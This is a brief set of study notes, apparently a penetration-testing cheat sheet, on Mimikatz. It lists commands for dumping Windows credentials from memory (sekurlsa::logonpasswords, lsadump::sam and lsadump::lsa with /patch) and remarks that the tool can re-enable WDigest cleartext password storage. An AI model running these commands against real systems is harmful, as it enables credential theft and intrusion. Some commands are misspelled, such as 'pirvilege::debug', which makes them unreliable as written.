# Mimikatz

Tool used to view and streal credentials, generate Kerberos tickets, and leverage attacks.

Dumps credentials stored in memory

pirvilege::debug
   
   - We want to see "20 OK"
   
   - This is to check that we can bypass memory protection

sekurlsa::logonpasswords

  - Can get users NTLM hash, and more

  - Notes:

        wdigest: Old way Windows stored passwords in memory from 7 and prior. Passwords were stored in clear text here. 8+ fixed this to be hashed by turing off the feature. Mimikatz can turn it back on. Once back on a new logon session will be need to occur.

lsadump::sam /patch

lsadump::lsa /patch

